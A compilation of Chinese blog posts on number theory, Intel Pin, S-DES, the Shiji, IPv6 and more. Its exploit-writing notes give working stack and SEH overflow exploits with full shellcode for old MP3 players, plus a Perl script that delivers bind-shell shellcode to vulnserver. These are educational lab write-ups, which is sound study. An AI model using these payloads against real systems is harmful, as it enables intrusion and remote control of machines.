的值恰好就是\(11\)的最小非负完全剩余系按一定顺序 排列的结果。所以经过如下的步骤

t = x[0] x[0] = x[i mod n] x[i mod n] = x[2i mod n] …… x[(n-2)*i mod n] = x[(n-1)*i mod n] x[(n-1)*i mod n] = t

之后，所有的元素都到了该去的地方，

当\((n,i)=d(d

eq 1)\)怎么办呢。从上面的结论我们可以知道每隔\({n}'=\frac{n}{d}\)之后，序列会从\(0,d,2d,\cdots,{n}'-d\)的某个序列重新开始，这样我们就又遇到\(x[0]\)了。这个时候我们需要将\(x[1]\)移到\(t\)，重复上述步骤，我们简要看看图示。

看看图示就明了了。

这是复习数论的时候遇到的一个结论，然后想起曾经的一个题。现在确实是完全清晰了。人说，数学是科学的女皇，数论是数学的女皇，数论里面充满着迷人的结论。这世间充满了美妙，我希望能够与诸君分享。
Source: 不忘初心 方得始终

**Intel Pin简介**
Pin是Intel公司开发的动态二进制插桩框架，可以用于创建基于动态程序分析工具，支持IA-32和x86-64指令集架构，支持windows和linux。 简单说就是Pin可以监控程序的每一步执行，提供了丰富的API，可以在二进制程序程序运行过程中插入各种函数，比如说我们要统计一个程序执行了多少条指令，每条指令的地址等信息。显然，这样我们对程序完全掌握了以后是可以做很多事的。比如对程序的内存使用检测，对程序的性能评估，实际上我是在很多介绍Taint分析的文章中知道Pin，我也准备对Pin写一个系列的文章。 本节简单叙述一下PinTools在windows下的编译 1.Pin官网按照VS的版本选择对应的Pin版本 2.安装Cygwin，记得选择安装make工具 3.安装好Cygwin之后，将Cygwin目录下面的bin目录添加到环境变量Path中 4.通过VS的命令行进入pin/source/tools/ManualExamples目录下，使用make命令即可编译ManualExamples下的例子，也可以在tools目录下编译所有PinTools，windows下生成的文件一般都是dll。 在cmd下运行命令（test.exe自己随便写的helloword，itrace.dll就是2中编译出来的manualExamples/obj-ia32下面的dll） 结果会在文件夹下面生成一个itrace.out文件，里面记录的就是各个指令的地址，通过与OD里面的反汇编的结果我们可以看到，pin并不是从二进制映像文件的第一条指令记录，而是从进程的指令记录（似乎也不是第一条），也就是ntdll里面线程执行函数开始的。 本部分翻译自Pin文档，肯定有不少问题，欢迎指正。 认识Pin的最好方法是认为它是一个JIT编译器。这个编译器的输入不是字节码而是普通的可执行文件。Pin截获这个可执行文件的第一条指令，产生新的代码序列。接着将控制流程转移到这个产生的序列。产生的序列基本上跟原来的序列是一样的，但是Pin保证在一个分支结束后重新获得控制权。重新获得控制权之后，Pin为分支的目标产生代码并且执行。Pin通过将所有产生的代码放在内存中，以便于重新使用这些代码并且可以直接从一个分支跳到另一个分支，这提高了效率。 在JIT模式，执行的代码都是Pin生成的代码。原始代码仅仅是用来参考。当生成代码时，Pin给用户提供了插入自己代码的机会（插桩）。 Pin的桩代码都会被实际执行的，不论他们位于哪里。大体上，对于条件分支存在一些异常，比如，如果一个指令从不执行，它将不会被插入桩函数。 概念上说，插桩包括两个组件： 这两个组件就是桩和分析代码。两个组件都在一个单独的可执行体重，即Pintool。Pintools可以认为是在Pin中的的插件，它能够修改生成代码的流程。 Pintool注册一些桩回调函数在Pin中，每当Pin生成新的代码时就调用回调函数。这些回调函数代表了桩组件。它可以检查将要生成的代码，得到它的静态属性，并且决定是否需要以及在哪里插入调用来分析函数。 分析函数收集关于程序的数据。Pin保证整数和浮点指针寄存器的状态在必要时会被保存和回复，允许传递参数给（分析）函数。 Pintool也可以注册一些事件通知回调，比如线程创建和fork，这些回调大体上用于数据收集或者初始化与清理。 由于Pintool类似插件一样工作，所以它必须处于Pin与被插桩的可执行文件的地址空间。这样，Pintool就能够访问可执行文件的所有数据。它也跟可执行文件共享文件描述符与进程其他信息。 Pin和Pintool从第一条指令控制程序。对于与共享库一起编译的可执行文件，这意味着动态加载器和共享库将会对Pintool可见。 当编写tools时，最重要的是调整分析代码而不是桩代码。因为桩代码执行一次，而分析代码执行许多次。 如上所述，Pin的插桩是实时的。插桩发生在一段代码序列执行之前。我们把这种模式叫做踪迹插桩（trace instrumentation）。 踪迹插桩让Pintool在可执行代码每一次执行时都能进行监视和插装。trace通常开始于选中的分支目标并结束于一个条件分支，包括调用(call)和返回(return)。Pin能够保证trace只在最上层有一个入口，但是可以有很多出口。如果在一个trace中发生分支，Pin从分支目标开始构造一个新的trace。Pin根据基本块(BBL)分割trace。一个基本块是一个有唯一入口和出口的指令序列。基本块中的分支会开始一个新的trace也即一个新的基本块。通常为每个基本块而不是每条指令插入一个分析调用。减少分析调用的次数可以提高插装的效率。trace插装利用了TRACE_AddInstrumentFunction API call。 注意，虽然Pin从程序执行中动态发现执行流，Pin的BBL与编译原理中的BBL定义不同。如，考虑生成下面的switch statement： 它将会产生如下的指令（在IA-32架构上） 在经典的基本块中，每一个addl指令会成为一个单指令基本块。但是Pin会对不同的这几种不同的switch cases产生包含4条指令的BBL(当遇到.L7 case），3个基本块（当遇到.L6 case），如此类推。这就是说Pin的BBL个数会跟用书上的定义的BBL不一样。例如，这里当代码分支到.L7时，有1个BBL，但是有四个经典的基本块被执行。 Pin也会拆散其他指令为BBL，比如cpuid,popf,和rep前缀的指令。因为rep前缀治理那个被当做隐式的循环，如果一个rep前缀指令不止循环一次，在第一次之后将会产生一个单指令的BBL，所以这种情形会产生比你预期多的基本块。 为了方便编写Pintool，Pin还提供乐指令插桩模式（instruction instrumentation），让工具可以监视和插装每一条指令。本质上来说这两种模式是一样的，编写Pintool时不需要在为trace的每条指令反复处理。就像在trace插桩模式下一样，特定的基本块和指令可能会被生成很多次。指令插装用到了 INS_AddInstrumentFunction API call。 有时，进行不同粒度的插桩比trace更有用。Pin对这种模式提供了两种模式：镜像和函数插桩。这些模式是通过缓存插桩要求，因此需要额外的空间，这些模式也称作提前插桩。 镜像插装让Pintool在IMG第一次导入的时候对整个image进行监视和插装。Pintool的处理范围可以是镜像中的每个块(section，SEC)，块中的每个函数(routine, RTN)，函数中的每个指令（instruction, INS）。插装可以在一个函数或者一条指令开始执行之前或者结束执行之后执行。镜像插装用到了 IMG_AddInstrumentFunction API call。镜像插装依靠符号信息判断函数的边界，因此需要在PIN_Init之前调用PIN_InitSymbols。 函数插装让Pintool在线程第一次调用之前监视和插装整个函数。Pintool的处理范围可以是函数里的每条指令。这里没有足够的信息把指令归并成基本块。插装可以在一个函数或者一条指令开始执行之前或者结束执行之后执行。函数插桩时Pintool的作者能够更方便的在镜像插桩过程中便利各个sections。 函数插装用到了RTN_AddInstrumentFunction API call。插装在函数结束后不一定能可靠地工作，因为当最后出现调用时无法判断何时返回。 注意在镜像插桩和函数插桩中，不可能知道一个(分析）函数会被执行（因为这些插桩实发生在镜像被载入时）。在Trace和Instruction中只有被执行的代码才会被遍历。 Pin支持所有可执行文件包括托管的二进制文件。从Pin的角度来看，托管文件是一种自修改程序。有一种方法可以使Pin区分即时编译的代码(Jitted代码)和所有其他动态生成的代码,并且将Jitted代码与合适的管理函数联系在一起。为了支持这个功能，运行管理托管平台的JIT compiler必须支持Jit Profiling API。 必须支持下面的功能： 为了支持托管平台，以下条件必须满足： 设置INTEL_JIT_PROFILER32和INTEL_JIT_PROFILER64环境变量，以便占用pinjitprofiling dynamic library For Windows For Linux 在Pin命令行为Pin tool加入knob support_jit_api选项 Pin利用符号对象（SYM）提供了对函数名字的访问。符号对象仅仅提供了在程序中的关于函数的符号。其他类型的符号（如数据符号）需要通过tool独立获取。 在Windows上，可以通过dbghelp.dll实现这个功能。注意在桩函数中使用dbghelp.dll并不安全，可能会导致死锁。一个可能的解决方案是通过一个不同的未被插桩的进程得到符号。 在Linux上，libefl.so或者libdwarf.so可以用来获取符号信息。 为了通过名字访问函数必须先调用PIN_InitSymbols。 Pin在执行各种分析函数时保持者程序的浮点指针状态。 IARG_REG_VALUE不能作为浮点指针寄存器参数传给分析函数。 给多线程程序插桩时，多个合作线程访问全局数据时必须保证tool是线程安全的。Pin试图为tool提供传统C++程序的环境，但是在一个Pintool是不可以使用标准库的。比如，Linux tool不能使用pthread，Windows不能使用Win32API管理线程。作为替代，应该使用Pin提供的锁和线程管理API。 Pintools在插入桩函数时，不需要添加显示的锁，因为Pin是在得到VM lock内部锁之后执行这些函数的。然而，Pin并行执行分析代码和替代函数，所以Pintools如果访问这些函数，可能需要为全局数据加锁。 Linux上的Pintools需要注意在分析函数或替代函数中使用C/C++标准库函数，因为链接到Pintools的C/C++标准函数不是线程安全的。一些简单C/C++函数本身是线程安全的，在调用时不需要加锁。但是，Pin没有提供一个线程安全函数的列表。如果有怀疑，需要在调用库函数的时候加锁。特别的，errno变量不是多线程安全的，使用这个变量的tool需要提供自己的锁。注意这些限制仅存在Unix平台，这些库函数在Windows上是线程安全的。 Pin可以在线程开始和结束的时候插入回调函数。这为Pintool提供了一个比较方便的地方分配和操作线程局部数据。 Pin也提供了一个分析函数的参数（ARG_THREAD_ID），用于传递Pin指定的线程ID给调用的线程。这个ID跟操作系统的线程ID不同，它是一个从0开始的小整数。可以作为线程数据或是用户锁的索引。 除了Pin线程ID，Pin API提供了有效的线程局部存储(TLS），提供了分配新的TLS key并将它关联到指定数据的清理函数的选项。进程中的每个线程都能够在自己的槽中存储和取得对应key的数据。所有线程中key对应的value都是NULL。 False共享发生在多个线程访问相同的缓cache line的不同部分,至少其中之一是写。为了保持内存一致性，计算机必须将一个CPU的缓存拷贝到另一个，即使其他数据没有共享。可以通过将关键数据对其到cache line上或者重新排列数据结构避免False共享。 因为Pin,the tool和程序可能都会要求或释放锁，Pin tool的开发者必须小心避免死锁。死锁经常发生在两个线程以不同的顺序要求同样的锁。例如，线程A要求lock L1，接着要求L2,线程B要求lock L2，接着要求L1。如果线程A得到了L1，等待L2，同时线程B得到了L2，等待L1，这就导致了死锁。为了避免死锁,Pin为必须获得的锁强加了一个层次结构。Pin在要求任何锁时会要求自己的内部锁。我们假设应用将会在这个层次结构的顶端获得锁。下面的图展示了这种结构： Pin tool开发者在设计他们自己的锁时不应该破坏这个锁层次结构。下面是基本的指导原则： 如果tool在一个Pin回调中要求任何锁，它在从这个回调中返回时必须释放这些锁。从Pin内部锁看来，在Pin回调中占有一个锁违背了这个层次结构。 虽然上述的指导在大多数情况下已经足够，但是它们活血在某些特定的情形下显得比较严格。下面的指导解释了上述基本指导的放松情形： 在JIT模式下，tool可能在分析函数中要求锁而不释放它们，直到将要离开包含这个分析函数的trace。tool必须期望trace在程序还没有抛出异常的时尽早退出。任何被tool占有的锁L在程序抛出异常时，必须遵守以下规则： 如果tool从一个分析函数中调用Pin API，如果在调用API时繁盛了下面情况，它可能会要求并占有一个锁L：
Source: 不忘初心 方得始终

**回溯算法及其例子**
public class StackSeq { public static boolean isOk(int[] input,int n) { int index = 0; int in = 0; Stack<Integer> s = new Stack<Integer>(); while(true) { if(index >= n - 1) return true; if(in >= n) return false; if(in != input[index]) { s.push(in); ++in; continue; } ++in; ++index; while(!s.isEmpty() && s.peek() == input[index]) { ++index; s.pop(); } } } public static void main(String[] args) { StdOut.println("input the number of arrays:"); int n = StdIn.readInt(); int[] input = new int[n]; while(true) { for (int i = 0 ; i < n ; ++i) { input[i] = StdIn.readInt(); } boolean ret = isOk(input,n); if(ret == true) { StdOut.println("the sequeue is ok!"); } else StdOut.println("the sequeue is not ok!"); } } }
Source: 不忘初心 方得始终

**autotool工具简介**
# -*- Autoconf -*- # Process this file with autoconf to produce a configure script. # Checks for header files. AC_CONFIG_FILES([Makefile lib/Makefile src/Makefile]) AC_OUTPUT
Source: 不忘初心 方得始终

**exploit编写笔记1——基于栈的溢出**
很早以前对漏洞利用这一块就有所了解，当时觉得这些都是一些小tricky，玩的都是一些故意的玩具漏洞，这段时间准备重新拾起来，开始按照教材corelan上面的教材一个一个对着实际的漏洞写exploit。这是第一篇，古老的buffer overflow。因为之前都是OD or windbg，现在要练习一下Immunity Debugger。所以这篇都是用的Immunity。

目标软件

Easy RM to MP3 Converter（版本2.7.3.700）

工具

Immunity Debugger

漏洞描述

通过创建一个恶意的.m3u文件将触发Easy RM to MP3 Converter (version 2.7.3.700)缓冲区溢出利用。

测试平台

Microsoft Windows XP Professional 5.1.2600 Service Pack 3 Build 2600

下面是详细的exploit步骤

1. 寻找shellcode存放的地址空间

再次使用上面.m3u文件，崩溃时，打开栈的窗口

我们看到在ESP此时为000FF730，EIP到这里还有3*4=12个字节。ESP开始用于存放shellcode。

4. 构造最终的输入文件

shellcode = ("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B" "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9" "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C" "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0" "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B" "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72" "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03" "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47" "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F" "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72" "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66" "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14" "\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72" "\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F" "\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01" "\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65" "\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B" "\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42" "\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24" "\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57" "\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01" "\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F" "\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24" "\x40\xFF\x54\x24\x40\x57\xFF\xD0"); ret = "\x13\x44\x87\x7c"; filename = "crash.m3u" f = open(filename,'w') data = 'A' * 26067 + ret + '\x90' * 12 + shellcode f.write(data) f.close()

我们看到，成功利用了这个漏洞。
Source: 不忘初心 方得始终

**一道XDCSC2010溢出题**
signed int __cdecl sub_401000() { HANDLE v0; // eax@1 void *v1; // edi@1 void *v2; // ebp@1 HANDLE v3; // eax@1 void *v4; // esi@1 unsigned int v5; // ebx@2 HMODULE v6; // esi@3 signed int v8; // [sp+10h] [bp-318h]@1 void *hHeap; // [sp+14h] [bp-314h]@1 HANDLE v10; // [sp+18h] [bp-310h]@1 DWORD NumberOfBytesRead; // [sp+1Ch] [bp-30Ch]@1 int (**v12)(); // [sp+20h] [bp-308h]@1 char v13; // [sp+24h] [bp-304h]@4 int v14; // [sp+A4h] [bp-284h]@1 char v15; // [sp+A8h] [bp-280h]@6 char Buffer; // [sp+128h] [bp-200h]@3 v8 = 0; v12 = &off_4050B4; v14 = (int)off_4050B0; NumberOfBytesRead = 0; v0 = HeapCreate(0, 0x1000u, 0x10000u); v1 = v0; hHeap = v0; v2 = HeapAlloc(v0, 0, 0x200u); v3 = CreateFileA("exploit.dat", 0x80000000u, 1u, 0, 4u, 0x80u, 0); v4 = v3; v10 = v3; if ( v3 != (HANDLE)-1 ) { v5 = GetFileSize(v3, 0); if ( v5 <= 0x200 ) { ReadFile(v4, &Buffer, v5, &NumberOfBytesRead, 0); memcpy(v2, &Buffer, v5); memset(&Buffer, 0, 0x200u); v6 = LoadLibraryA("user32.dll"); dword_408510 = (int)GetProcAddress(v6, "MessageBoxW"); dword_408514 = (int)GetProcAddress(v6, "MessageBoxA"); if ( v5 <= 0x84 ) memcpy(&v13, v2, v5); HeapFree(hHeap, 1u, v2); memset(v2, 0, 0x80u); if ( v5 <= 0x84 ) memcpy(&v15, v2, v5); ((void (__thiscall *)(int (***)()))*v12)(&v12); (*(void (__thiscall **)(int *))v14)(&v14); v1 = hHeap; v4 = v10; v8 = 1; } } if ( v4 ) CloseHandle(v4); if ( v2 ) HeapFree(v1, 1u, v2); if ( v1 ) HeapDestroy(v1); return v8; }
Source: 不忘初心 方得始终

**XDCSC2010破解题1**
这种格式，其实scanf还有这种格式scanf(“This is test%s”,a),这个时候我们输入的时候就必须要输入前面的非格式控制字符”This is test”然后才能输入%s对应的字符串，并且a缓冲区只存放%s部分。这个程序里面是将密码与缓冲区一一比较。我们的data中1F作为对应的非控制字符，为了跟密码一样，我们还得输入一个1f，也就是data的内容应该是：

© 2025 Terenceli with help from Jekyll Bootstrap and Twitter Bootstrap
Source: 不忘初心 方得始终

**XDCSC2010破解题2**
import os #f = open('ret.txt','w') for i in range(10): for j in range(10): for k in range(10): param = str(i)+str(j)+str(k) ret = os.popen('1.exe ' + param) #f.write(param + ":" + ret.read()) if(ret.read() == "Yes

"): print 'The answer is :' + param #f.close()
Source: 不忘初心 方得始终

**Windows用户态异常处理**
#include "stdafx.h" //================================================== // MYSEH - Matt Pietrek 1997 // Microsoft Systems Journal, January 1997 // FILE: MYSEH.CPP // To compile: CL MYSEH.CPP //================================================== #define WIN32_LEAN_AND_MEAN #include <windows.h> #include <stdio.h> DWORD scratch; EXCEPTION_DISPOSITION __cdecl _except_handler( struct _EXCEPTION_RECORD *ExceptionRecord, void * EstablisherFrame, struct _CONTEXT *ContextRecord, void * DispatcherContext ) { unsigned i; // Indicate that we made it to our exception handler printf( "Hello from an exception handler/n" ); // Change EAX in the context record so that it points to someplace // where we can successfully write ContextRecord->Eax = (DWORD)&scratch; // Tell the OS to restart the faulting instruction return ExceptionContinueExecution; } int main() { DWORD handler = (DWORD)_except_handler; __asm { // 创建 EXCEPTION_REGISTRATION 结构： push handler // handler函数的地址 push FS:[0] // 前一个handler函数的地址 mov FS:[0],ESP // 装入新的EXECEPTION_REGISTRATION结构 } __asm { mov eax,0 // EAX清零 mov [eax], 1 // 写EAX指向的内存从而故意引发一个错误 } printf( "After writing!/n" ); __asm { // 移去我们的 EXECEPTION_REGISTRATION 结构记录 mov eax,[ESP] // 获取前一个结构 mov FS:[0], EAX // 装入前一个结构 add esp, 8 // 将 EXECEPTION_REGISTRATION 弹出堆栈 } return 0; }
Source: 不忘初心 方得始终

**exploit编写笔记2——基于SEH的exploit**
这是exploit编写的第二篇笔记，基于SEH的exploit。SEH的原理在之前的文章中已经做了详细说明，这里不再赘述。这次的例子是Soritong MP3 player 1.0上的漏洞，程序下载：soritong10.exe。 这个漏洞指出一个畸形皮肤文件将导致溢出，我们用python创建一个ui.txt文件并放到skin\default文件夹下面： 打开soritong mp3，可以看到无声崩溃掉，使用windbg查看seh的prev和handler都被我们的’A’覆盖了。  当异常发生时，程序会跳转到SEH handler去执行，通过将这个handler的值设置为程序自带模块的一个pop/pop/ret地址，能够实现程序跳转到next seh pointer去，在next seh中需要做的就是跳转到shellcode执行。corelan的教程说的是造成一个二次异常，我觉得不是，就是简单的ret将next seh的值弹到了eip而已。shellcode的布局大致如下： [junk][next seh][seh][shellcode] next seh是一个跳转到shellcode的指令，seh是一个程序自带模块的p/p/r地址。 通过mona的pattern可以找到需要seh需要覆盖的偏移为588。一个short jmp机器码是eb，跟上跳转距离，跳过6字节的short jmp机器码为eb 06。所以使用0xeb,0x06,0x90,0x90覆盖 next seh。 查找pop pop ret指令   也就是说se handler在588个字节后被覆盖，next seh就在584个字节后被覆盖， 接着，我们找p/p/r地址 我们随便选一个如10012984. 这里再解释一下pop pop ret指令的作用，当异常发生的时候，异常分发器创建自己的栈帧，会奖EH handler成员压入新创的栈帧中，在EH结构中有一个域是EstablisherFrame。这个域指向异常注册记录(next seh)的地址并被压入栈中，当一个函数被调用的时候被压入的这个值都是位于ESP+8的地方。使用pop pop ret后，就会将next seh的地址放到EIP中。 最终的shellcode就是 junk:584字节 ‘A’ next seh:”\xeb\x06\x90\x90” seh:”\x84\x29\x01\x10” shellcode：完成功能的，随便找了一个弹计算器的 并且在最后加了一些垃圾数据 将ui.txt文件放在skin/default里面，再点击原程序，发现弹出了计算器。
Source: 不忘初心 方得始终

**exploit编写笔记3——编写Metasploit exploit**
# print " --------------------------------------

"; print " Writing Buffer Overflows

"; print " Peter Van Eeckhoutte

"; print " http://www.corelan.be:8800

"; print " --------------------------------------

"; print " Exploit for vulnserver.c

"; print " --------------------------------------

"; use strict; use Socket; my $junk = "\x90" x 504; #jmp esp (from ws2_32.dll) my $eipoverwrite = pack('V',0x71a22b53); #add some NOP's my $shellcode="\x90" x 50; # windows/shell_bind_tcp - 702 bytes # http://www.metasploit.com # Encoder: x86/alpha_upper # EXITFUNC=seh, LPORT=5555, RHOST= $shellcode=$shellcode."\x89\xe0\xd9\xd0\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x43" . "\x48\x59\x45\x59\x4a\x55\x4e\x4d\x51\x47\x4b\x4f\x48\x56" . "\x41\x41"; # initialize host and port my $host = shift || '192.168.10.130'; my $port = shift || 200; my $proto = getprotobyname('tcp'); # get the port address my $iaddr = inet_aton($host); my $paddr = sockaddr_in($port, $iaddr); print "[+] Setting up socket

"; # create the socket, connect to the port socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!"; print "[+] Connecting to $host on port $port

"; connect(SOCKET, $paddr) or die "connect: $!"; print "[+] Sending payload

"; print SOCKET $junk.$eipoverwrite.$shellcode."

"; print "[+] Payload sent

"; print "[+] Attempting to telnet to $host on port 5555...

"; system("telnet $host 5555"); close SOCKET or die "close: $!";
Source: 不忘初心 方得始终

**《史记·五帝本纪第一》笔记**
最近因为在Coursera上面跟台大吕世浩老师的《史记》，自己准备重新认真学习一下史记。在这里做些笔记。 《史记》是我在高中的时候看的，当时关注的是优美的文字与故事情节，现在听了吕世浩老师的课，觉得很有必要重新看一遍，
然后自己买了三家注的《史记》，繁体竖版，质量好，很值得收藏啊。 上周周末把《史记》第一篇《五帝本纪第一》看完了，在这里做个总结。 首先五帝的关系如下图所示：  图中红色字体表示的就是五帝。 黄帝：不用多说了，所谓的炎黄子孙中的黄就是他。黄帝通过阪泉之战战胜了炎帝，通过逐鹿之战战胜了蚩尤，得有天下。 高阳：就是颛顼了。 高辛：就是帝喾。 放勋：帝尧，他哥挚当皇帝不行，他就上了。 重华：帝舜，帝尧到帝舜这都隔了多少代了，神话还是神话啊。 尧舜禅让历来为人们所乐道，部落联盟推举制度也是自古就有的。尧舜禅让与部落联盟推举天子的制度至少有三方面的不同。 生让：其他部落联盟推举天子都是前一任的天子死掉，大家再决定下一任的继承者，尧舜都是活着就在找人了； 侧陋：是说尧找继承人的时候不是说一定要身边的贵族，即使是民间隐匿者也可以是，只要你有能力； 试可：这是最重要的，因为是生让，所以才可以试可，在活着的时候就要多方考验这个人，看这个人足不足以担当大任。 这是三个最重要的不同，也是中国文化的精神。这种精神是说天下乃是重器，不可轻易授之于人。所谓“夫天下至重也”。因为至重，交给一个人的时候一定要格外小心，不能够有自己的私心，也要多方考验，这个人是否足以承担大任。这就是中国人禅让真正的思想。 五帝本纪上说： 这段话是说夏商周三代以前的历代帝王全都是黄帝的子孙。司马迁以此找出一个天下一家的来源，相信所有的人都有共同的来源，太史公所以以黄帝为中华民族的始祖，就是这个原因。 自古三皇五帝就有很多传说，《尚书》记载的是尧以来的事，百家言黄帝各有各的说法，那个时候各种传说流传，缙绅也不知道怎么评价黄帝。作为历史学家的司马迁怎么办呢？ “余尝西至空桐，北过涿鹿，东渐於海，南浮江淮矣，至长老皆各往往称黄帝、尧、舜之处，风教固殊焉，总之不离古文者近是。” 司马迁于是走访各处，访问当地的人民，查阅古籍，得出了“不离古文者近是”的结论。司马迁写下一句意味深长的话： 太史公为了后来读《史记》的人确立一个阅读的基本原则：要读懂我这本书，一定要是好学深思，心知其意的人。 读完《五帝本纪》需要注意一个现象，整篇文章只言治不言乱，并不是因为太史公捏造事实，而是太史公觉得这是中国最好的政治理想，而且他相信这个理想曾经是存在过的。
Source: 不忘初心 方得始终

**Simplified DES简介**
Simplified DES是由Edard Schaefer教授开发的用于教学的简单加密算法，它与DES有着相似的属性与结构，只是参数比较小而已。通过这种简单的，能够实现手工加解密的算法能让我们加深对DES的理解。 图1是simplified DES（下称S-DES)的总体结构图。S-DES加密算法使用8位明文（如10111101）和10位密钥作为输入，产生8位密文。相反的，S-DES解密算法使用8位密文和10位相同的密钥作为输入，生产8位明文。  加密算法包括5个函数：初始的置换函数(\(IP{}^{}\))；一个复杂的函数\(f{}_{k}\)，这个函数包括取决于输入的置换和替换操作；一个简单的置换函数\(SW\)，用于置换输入数据的前后2个部分；然后又是\(f{}_{k}\)；最后是初始置换函数的逆（\(IP{}^{-1}\)）。 \(f{}_{k}\)的输入包括明文和8位密钥，我们可以使用16位的密钥，每一轮使用8位（共两轮\(f{}_{k}\)），也可以使用8位密钥，每一次都使用相同的密钥。作为折中，我们使用了10位密钥，每一次的\(f{}_{k}\)通过移位产生8位密钥。两个密钥的产生如图2：  这个算法中，密钥首先通过一个置换函数（\(P10\)）。然后左移一位，输出通过一个置换函数（\(P8\)），产生第一个密钥\(K_{1}\)。左移一位之后的结果再进行移位和置换（\(P8\)），产生第二个密钥\(K_{2}\)。 我们将S-DES的加密算法使用函数组合表达如下： 也就是 其中 解密算法也在图1中，可以表示成加密算法的逆运算。 图2显示了子密钥的生成。 首先，按照一定方式对输入密钥进行置换。如输入的10位密钥是\((k_{1},k_{2},k_{3},k_{4},k_{5},k_{6},k_{7},k_{8},k_{9},k_{10})\)。 \(P10\)如下定义： P10可以简单表示如下：  这个表的意思就是说第一个输出是输入的第3位，第二个输出是输入的第5位，以此类推。如，密钥1010000010被置换成1000001100。 接下来进行循环左移一位(LS-1)，是将密钥分成左右两部分（每部分5位），左右各循环左移一位。这个例子中，得到00001 11000. 接着执行\(P8\)，从10位输出中选出8位密钥，P8定义如下：  结果就是第一个子密钥(\(K_{1}\)），在我们这个例子中，是10100100。 然后利第一次左移一位产生的一对5位数据（00001 11000）进行左移两位。这个例子中的结果是00100 00011。最后，通过P8之后结果产生 \(K_{2}\)。这个例子中是01000011。 图3展示了S-DES加密算法的细节。这部分详细介绍加密流程中的5个函数。  初始和结尾的置换函数： 对于输入的8位明文，我们需要使用\(IP\)对其进行重新置换：  在算法末尾，需要进行相反的操作：  可以验证\(IP^{-1}(IP(X)) = X\)。 \(f_{K}\)函数： S-DES中最复杂的部分就是函数\(f_{K}\)了，这个函数包含了置换的和替换的组合。这个函数解释如下。首先让L和R分别表示\(f_{K}\)8位输入的左边4位和右边4位，F是一个4位到4位的映射。则 SK是一个子密钥。 下面解释F。它的输入是4位数\((n_{1} n_{2} n_{3} n_{4})\)，第一个操作是扩展与置换：  为了方便起见，写成如下形式：  将8位的子密钥\(K_{1} = (k_{11},k_{12},k_{13},k_{14},k_{15},k_{16},k_{17},k_{18})\)与上面的数进行异或：  重新命名这8个数：  前面4位用于在第一个S盒产生一个2位输出，后面4位在第二个S盒产生一个2位输出，两个S盒定义如下：  S盒操作如下：第一个和第四个输入作为一个2位数指定S盒中的一行，第二和第三个输入作为一个2位数指定S盒中的一列。比如\((p_{0,0}p_{0,3})=(00)\) 和\((p_{0,1}p_{0,2})=(10)\) ，则输出是S盒的第一行第二列这里是3（二进制的11），类似的\((p_{1,0}p_{1,3})\) 和\((p_{1,1}p_{1,2})\)的值找到在第二个S盒中的值。 接着，由两个S盒产生的4位置通过一个置换函数\(P4\)： \(P4\)的输出就是F的输出。 SW函数： \(f_{K}\)函数仅仅处理左边的4位，SW函数将左右互换然后就处理了后面的4位。第二轮的\(f_{K}\)中，E/P,S0,S1和P4都跟第一轮一样的，只有子密钥变成了\(K_{2}\)。 在网上找到了一个S-DES的例子，希望大家能自己走一遍流程。 S-DES
Source: 不忘初心 方得始终

**IPv6 学习笔记**
IPv6 学习笔记

说来惭愧，我直到最近，2023 年了，才终于正式用上了原生 IPv6 网络（之前只用过 Hurricane Electric 和 Cloudflare 的隧道）。十几年根深蒂固的 IPv4 思维让我在了解和学习 IPv6 的过程中充满了惊奇和欣喜。响应「整理是最好的复习」号召，我决定将我学到的知识整理成这篇博客文章。

本文试图用小黄鸭也能听懂的方式，从较为简单的 IPv4 基础知识开始由浅入深地讲到 IPv6。

一、IP 地址的写法

IPv4

IP 地址对于计算机来说是一串 0 和 1 组成的二进制数字。IPv4 地址是 32 bit 的，即由 32 个 0 和 1 组成。对于人类来说，常用的写法是把这 32 个 bit 分成 4 组，每组 8 bit，转成十进制，中间用点隔开——即所谓的「点分十进制」。因为每组是 8 bit，所以每个十进制数字的范围在 0 到 255 之间。

比如 Google 的 IPv4 地址（之一）：

142.251.215.238

点分十进制用对人类比较友好的方式，简明地表达了从最小的 0.0.0.0 到最大的 255.255.255.255 一共 42 亿个地址。

一群计算机组成一个网络，这个网络中最小的地址用来表示这个网络本身。比如以下 256 个地址组成了一个网络：

142.251.215.0 142.251.215.1 142.251.215.2 ... 142.251.215.253 142.251.215.254 142.251.215.255

……则用 142.251.215.0 表示这个网络本身。

CIDR 用来简明地表示一个 IP 地址与其在的网络的关系。上述网络中的某个地址 142.251.215.42 可以表示为：

142.251.215.42/24

其中 /24 代表前缀长度。在这个例子的 256 个地址中，点分十进制的前三段都是相同的，变化的只是最后一段。前三段每段是 8 bit，总共是 24 bit 用于表示网络，因此前缀长度是 /24。前缀长度越大，固定的 bit 越多，变化的 bit 越少，这个网络就越小。此处前缀长度是 /24，则可变的部分是 8 bit，总共 256 个地址，符合预期。

在 IPv4 中，用 CIDR 可以表示从 /0 到 /32 各种大小的网络，其中 /0 代表整个 IPv4 地址空间，/32 代表大小为 1 的网络。

IPv6

